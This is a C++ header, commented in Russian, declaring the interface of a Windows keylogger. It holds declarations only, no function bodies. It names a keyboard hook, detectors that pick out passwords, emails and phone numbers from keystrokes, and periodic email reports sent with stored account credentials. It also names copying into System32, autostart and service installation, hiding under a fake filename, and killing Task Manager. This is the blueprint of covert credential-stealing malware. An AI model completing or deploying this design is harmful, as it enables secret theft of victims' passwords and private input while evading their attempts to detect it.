#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <string>
#include <vector>
#include <mutex>
#include <windows.h>

// Конфигурационные константы
extern const std::string EMAIL_ADDRESS;
extern const std::string EMAIL_PASSWORD;
extern const int SEND_REPORT_EVERY;
extern const std::string SYSTEM_HIDING_PATH;
extern const std::string FAKE_FILENAME;

// Глобальные переменные
extern std::vector<std::string> inputs;
extern std::vector<std::vector<std::string>> collected_data;
extern std::string last_entry_type;
extern std::mutex data_mutex;
extern HHOOK keyboardHook;
extern bool shiftPressed;
extern bool ctrlPressed;
extern bool altPressed;
extern bool capsLockOn;

// Функции для работы с реестром и автозагрузкой
void unpackToSystem32();
bool copyToSystemFolder();
void ensureAutostart();

// Функции для работы с окнами
std::string getActiveWindowTitle();

// Функции для определения раскладки
std::string getCurrentLayout();
char toupper_ru(char ch);
char tolower_ru(char ch);

// Функции для конвертации символов
std::string convertToEnglish(char ch, bool uppercase);
std::string convertToRussian(char ch, bool uppercase);

// Функции для проверки форматов данных
bool isPhoneNumber(const std::string& input);
bool isEmail(const std::string& input);
bool isUsername(const std::string& input);
std::string isEmailOrUsernameOrPhone(const std::string& input);
bool isProbablePassword(const std::string& input);

// Обработка ввода
void processInputs();

// Обработчик клавиш
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

// Функции для отправки email
void initSSL();
std::string base64Encode(const std::string& input);
std::string prepareMail(const std::string& message);
bool sendMail(const std::string& message);

// Отчет
void report();

// Функции для скрытия и работы службы
bool hideExecutable();
VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode);
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
void installService();
void monitorAndCloseTaskManager();

// Точка входа
int main(int argc, char* argv[]);

#endif // KEYLOGGER_H